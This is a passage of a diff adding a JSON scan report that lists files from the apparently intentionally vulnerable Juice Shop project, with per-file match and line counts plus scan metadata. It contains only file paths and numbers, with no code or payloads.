+        "lines_scanned": 20
+      },
+      {
+        "file": "routes/recycles.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "routes/redirect.ts",
+        "matches": 0,
+        "lines_scanned": 33
+      },
+      {
+        "file": "routes/repeatNotification.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "routes/resetPassword.ts",
+        "matches": 0,
+        "lines_scanned": 86
+      },
+      {
+        "file": "routes/restoreProgress.ts",
+        "matches": 0,
+        "lines_scanned": 80
+      },
+      {
+        "file": "routes/saveLoginIp.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "routes/search.ts",
+        "matches": 0,
+        "lines_scanned": 74
+      },
+      {
+        "file": "routes/securityQuestion.ts",
+        "matches": 0,
+        "lines_scanned": 31
+      },
+      {
+        "file": "routes/showProductReviews.ts",
+        "matches": 0,
+        "lines_scanned": 50
+      },
+      {
+        "file": "routes/trackOrder.ts",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "routes/updateProductReviews.ts",
+        "matches": 0,
+        "lines_scanned": 31
+      },
+      {
+        "file": "routes/updateUserProfile.ts",
+        "matches": 0,
+        "lines_scanned": 47
+      },
+      {
+        "file": "routes/userProfile.ts",
+        "matches": 0,
+        "lines_scanned": 103
+      },
+      {
+        "file": "routes/verify.ts",
+        "matches": 0,
+        "lines_scanned": 333
+      },
+      {
+        "file": "routes/videoHandler.ts",
+        "matches": 0,
+        "lines_scanned": 92
+      },
+      {
+        "file": "routes/vulnCodeFixes.ts",
+        "matches": 0,
+        "lines_scanned": 99
+      },
+      {
+        "file": "routes/vulnCodeSnippet.ts",
+        "matches": 0,
+        "lines_scanned": 116
+      },
+      {
+        "file": "routes/wallet.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "routes/web3Wallet.ts",
+        "matches": 0,
+        "lines_scanned": 34
+      },
+      {
+        "file": "rsn/cache.json",
+        "matches": 0,
+        "lines_scanned": 786
+      },
+      {
+        "file": "rsn/rsn-update.ts",
+        "matches": 0,
+        "lines_scanned": 14
+      },
+      {
+        "file": "rsn/rsn-verbose.ts",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": "rsn/rsn.ts",
+        "matches": 0,
+        "lines_scanned": 21
+      },
+      {
+        "file": "rsn/rsnUtil.ts",
+        "matches": 0,
+        "lines_scanned": 157
+      },
+      {
+        "file": "test/apiTestsSetup.ts",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "test/apiTestsSetupJest.ts",
+        "matches": 0,
+        "lines_scanned": 6
+      },
+      {
+        "file": "test/apiTestsTeardown.ts",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "test/api/2faSpec.ts",
+        "matches": 11,
+        "lines_scanned": 469
+      },
+      {
+        "file": "test/api/addressApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 192
+      },
+      {
+        "file": "test/api/administrationApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 33
+      },
+      {
+        "file": "test/api/angularDistSpec.ts",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": "test/api/apiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "test/api/authenticatedUsersSpec.ts",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "test/api/b2bOrderSpec.ts",
+        "matches": 0,
+        "lines_scanned": 84
+      },
+      {
+        "file": "test/api/basketApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 196
+      },
+      {
+        "file": "test/api/basketItemApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 269
+      },
+      {
+        "file": "test/api/challengeApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 137
+      },
+      {
+        "file": "test/api/chatBotSpec.ts",
+        "matches": 0,
+        "lines_scanned": 421
+      },
+      {
+        "file": "test/api/complaintApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 62
+      },
+      {
+        "file": "test/api/countryMapppingSpec.ts",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "test/api/dataExportApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 374
+      },
+      {
+        "file": "test/api/deliveryApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 137
+      },
+      {
+        "file": "test/api/deluxeApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 240
+      },
+      {
+        "file": "test/api/erasureRequestApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 156
+      },
+      {
+        "file": "test/api/feedbackApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 321
+      },
+      {
+        "file": "test/api/fileServingSpec.ts",
+        "matches": 0,
+        "lines_scanned": 185
+      },
+      {
+        "file": "test/api/fileUploadSpec.ts",
+        "matches": 0,
+        "lines_scanned": 192
+      },
+      {
+        "file": "test/api/ftpFolderSpec.ts",
+        "matches": 0,
+        "lines_scanned": 163
+      },
+      {
+        "file": "test/api/httpSpec.ts",
+        "matches": 0,
+        "lines_scanned": 47
+      },
+      {
+        "file": "test/api/internetResourcesSpec.ts",
+        "matches": 0,
+        "lines_scanned": 81
+      },
+      {
+        "file": "test/api/languagesSpec.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "test/api/loginApiSpec.ts",
+        "matches": 1,
+        "lines_scanned": 280
+      },
+      {
+        "file": "test/api/memoryApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 174
+      },
+      {
+        "file": "test/api/metricsApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 64
+      },
+      {
+        "file": "test/api/orderHistoryApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 163
+      },
+      {
+        "file": "test/api/passwordApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 250
+      },
+      {
+        "file": "test/api/paymentApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 181
+      },
+      {
+        "file": "test/api/privacyRequestApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 63
+      },
+      {
+        "file": "test/api/productApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 124
+      },
+      {
+        "file": "test/api/productReviewApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 164
+      },
+      {
+        "file": "test/api/profileImageUploadSpec.ts",
+        "matches": 0,
+        "lines_scanned": 183
+      },
+      {
+        "file": "test/api/promotionVideoSpec.ts",
+        "matches": 0,
+        "lines_scanned": 35
+      },
+      {
+        "file": "test/api/quantityApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 337
+      },
+      {
+        "file": "test/api/recycleApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 73
+      },
+      {
+        "file": "test/api/redirectSpec.ts",
+        "matches": 0,
+        "lines_scanned": 83
+      },
+      {
+        "file": "test/api/repeatNotificationSpec.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "test/api/searchApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 200
+      },
+      {
+        "file": "test/api/securityAnswerApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 80
+      },
+      {
+        "file": "test/api/securityQuestionApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 87
+      },
+      {
+        "file": "test/api/socketSpec.ts",
+        "matches": 0,
+        "lines_scanned": 52
+      },
+      {
+        "file": "test/api/trackResultApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "test/api/userApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 373
+      },
+      {
+        "file": "test/api/userProfileSpec.ts",
+        "matches": 0,
+        "lines_scanned": 73
+      },
+      {
+        "file": "test/api/vulnCodeFixesSpec.ts",
+        "matches": 0,
+        "lines_scanned": 116
+      },
+      {
+        "file": "test/api/vulnCodeSnippetSpec.ts",
+        "matches": 0,
+        "lines_scanned": 100
+      },
+      {
+        "file": "test/api/walletApiSpec.ts",
+        "matches": 0,
+        "lines_scanned": 94
+      },
+      {
+        "file": "test/api/web3Spec.ts",
+        "matches": 0,
+        "lines_scanned": 157
+      },
+      {
+        "file": "test/cypress/tsconfig.json",
+        "matches": 0,
+        "lines_scanned": 8
+      },
+      {
+        "file": "test/cypress/e2e/administration.spec.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "test/cypress/e2e/b2bOrder.spec.ts",
+        "matches": 0,
+        "lines_scanned": 63
+      },
+      {
+        "file": "test/cypress/e2e/basket.spec.ts",
+        "matches": 0,
+        "lines_scanned": 154
+      },
+      {
+        "file": "test/cypress/e2e/changePassword.spec.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "test/cypress/e2e/chatbot.spec.ts",
+        "matches": 0,
+        "lines_scanned": 62
+      },
+      {
+        "file": "test/cypress/e2e/complain.spec.ts",
+        "matches": 0,
+        "lines_scanned": 167
+      },
+      {
+        "file": "test/cypress/e2e/contact.spec.ts",
+        "matches": 0,
+        "lines_scanned": 261
+      },
+      {
+        "file": "test/cypress/e2e/dataErasure.spec.ts",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "test/cypress/e2e/dataExport.spec.ts",
+        "matches": 0,
+        "lines_scanned": 32
+      },
+      {
+        "file": "test/cypress/e2e/deluxe.spec.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "test/cypress/e2e/directAccess.spec.ts",
+        "matches": 0,
+        "lines_scanned": 91
+      },
+      {
+        "file": "test/cypress/e2e/forgedJwt.spec.ts",
+        "matches": 0,
+        "lines_scanned": 32
+      },
+      {
+        "file": "test/cypress/e2e/forgotPassword.spec.ts",
+        "matches": 0,
+        "lines_scanned": 123
+      },
+      {
+        "file": "test/cypress/e2e/geoStalking.spec.ts",
+        "matches": 0,
+        "lines_scanned": 44
+      },
+      {
+        "file": "test/cypress/e2e/login.spec.ts",
+        "matches": 1,
+        "lines_scanned": 188
+      },
+      {
+        "file": "test/cypress/e2e/metrics.spec.ts",
+        "matches": 0,
+        "lines_scanned": 8
+      },
+      {
+        "file": "test/cypress/e2e/noSql.spec.ts",
+        "matches": 0,
+        "lines_scanned": 164
+      },
+      {
+        "file": "test/cypress/e2e/passwordHashLeak.spec.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "test/cypress/e2e/privacyPolicy.spec.ts",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "test/cypress/e2e/profile.spec.ts",
+        "matches": 2,
+        "lines_scanned": 119
+      },
+      {
+        "file": "test/cypress/e2e/publicFtp.spec.ts",
+        "matches": 0,
+        "lines_scanned": 55
+      },
+      {
+        "file": "test/cypress/e2e/redirect.spec.ts",
+        "matches": 0,
+        "lines_scanned": 35
+      },
+      {
+        "file": "test/cypress/e2e/register.spec.ts",
+        "matches": 0,
+        "lines_scanned": 117
+      },
+      {
+        "file": "test/cypress/e2e/restApi.spec.ts",
+        "matches": 0,
+        "lines_scanned": 119
+      },
+      {
+        "file": "test/cypress/e2e/scoreBoard.spec.ts",
+        "matches": 0,
+        "lines_scanned": 71
+      },
+      {
+        "file": "test/cypress/e2e/search.spec.ts",
+        "matches": 0,
+        "lines_scanned": 145
+      },
+      {
+        "file": "test/cypress/e2e/tokenSale.spec.ts",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "test/cypress/e2e/totpSetup.spec.ts",
+        "matches": 0,
+        "lines_scanned": 47
+      },
+      {
+        "file": "test/cypress/e2e/trackOrder.spec.ts",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": "test/cypress/support/commands.ts",
+        "matches": 0,
+        "lines_scanned": 65
+      },
+      {
+        "file": "test/cypress/support/e2e.ts",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "test/cypress/support/setup.ts",
+        "matches": 0,
+        "lines_scanned": 5
+      },
+      {
+        "file": "test/files/decrypt.py",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "test/files/decrypt_bruteforce.py",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "test/files/deprecatedTypeForServer.xml",
+        "matches": 0,
+        "lines_scanned": 23
+      },
+      {
+        "file": "test/files/encrypt.py",
+        "matches": 1,
+        "lines_scanned": 17
+      },
+      {
+        "file": "test/files/maxSizeForServer.xml",
+        "matches": 0,
+        "lines_scanned": 7085
+      },
+      {
+        "file": "test/files/outdatedLocalBackup.json",
+        "matches": 0,
+        "lines_scanned": 22
+      },
+      {
+        "file": "test/files/validLocalBackup.json",
+        "matches": 0,
+        "lines_scanned": 22
+      },
+      {
+        "file": "test/files/xxeBillionLaughs.xml",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "test/files/xxeDevRandom.xml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "test/files/xxeForLinux.xml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "test/files/xxeForWindows.xml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "test/files/xxeQuadraticBlowup.xml",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "test/files/yamlBomb.yml",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "test/server/angularSpec.ts",
+        "matches": 0,
+        "lines_scanned": 49
+      },
+      {
+        "file": "test/server/appConfigurationSpec.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "test/server/appVersionSpec.ts",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "test/server/b2bOrderSpec.ts",
+        "matches": 0,
+        "lines_scanned": 70
+      },
+      {
+        "file": "test/server/blueprintSpec.ts",
+        "matches": 0,
+        "lines_scanned": 66
+      },
+      {
+        "file": "test/server/botUtilsSpec.ts",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "test/server/challengeCountryMappingSpec.ts",
+        "matches": 0,
+        "lines_scanned": 53
+      },
+      {
+        "file": "test/server/challengeTagSpec.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "test/server/challengeTutorialSequenceSpec.ts",
+        "matches": 0,
+        "lines_scanned": 47
+      },
+      {
+        "file": "test/server/challengeUtilsSpec.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "test/server/chatBotValidationSpec.ts",
+        "matches": 0,
+        "lines_scanned": 73
+      },
+      {
+        "file": "test/server/codeSnippetSpec.ts",
+        "matches": 0,
+        "lines_scanned": 44
+      },
+      {
+        "file": "test/server/codingChallengeFixesSpec.ts",
+        "matches": 0,
+        "lines_scanned": 39
+      },
+      {
+        "file": "test/server/configValidationSpec.ts",
+        "matches": 0,
+        "lines_scanned": 520
+      },
+      {
+        "file": "test/server/continueCodeSpec.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "test/server/countryMappingSpec.ts",
+        "matches": 0,
+        "lines_scanned": 44
+      },
+      {
+        "file": "test/server/currentUserSpec.ts",
+        "matches": 1,
+        "lines_scanned": 43
+      },
+      {
+        "file": "test/server/easterEggSpec.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "test/server/fileServerSpec.ts",
+        "matches": 0,
+        "lines_scanned": 121
+      },
+      {
+        "file": "test/server/fileUploadSpec.ts",
+        "matches": 0,
+        "lines_scanned": 66
+      },
+      {
+        "file": "test/server/insecuritySpec.ts",
+        "matches": 0,
+        "lines_scanned": 206
+      },
+      {
+        "file": "test/server/keyServerSpec.ts",
+        "matches": 0,
+        "lines_scanned": 40
+      },
+      {
+        "file": "test/server/preconditionValidationSpec.ts",
+        "matches": 0,
+        "lines_scanned": 74
+      },
+      {
+        "file": "test/server/premiumRewardSpec.ts",
+        "matches": 0,
+        "lines_scanned": 42
+      },
+      {
+        "file": "test/server/redirectSpec.ts",
+        "matches": 0,
+        "lines_scanned": 88
+      },
+      {
+        "file": "test/server/utilsSpec.ts",
+        "matches": 0,
+        "lines_scanned": 211
+      },
+      {
+        "file": "test/server/verifySpec.ts",
+        "matches": 0,
+        "lines_scanned": 326
+      },
+      {
+        "file": "test/server/webhookSpec.ts",
+        "matches": 0,
+        "lines_scanned": 55
+      },
+      {
+        "file": "test/smoke/Dockerfile",
+        "matches": 0,
+        "lines_scanned": 7
+      },
+      {
+        "file": "test/smoke/smoke-test.sh",
+        "matches": 0,
+        "lines_scanned": 54
+      },
+      {
+        "file": "vagrant/bootstrap.sh",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "views/themes/themes.ts",
+        "matches": 0,
+        "lines_scanned": 63
+      }
+    ],
+    "file_errors": [],
+    "root_used_for_scan": "/app/uploads/extracted_projects/aaafddbbff38422989a67fe971a34534/juice-shop-master",
+    "extracted_file_count": 894
+  }
+}
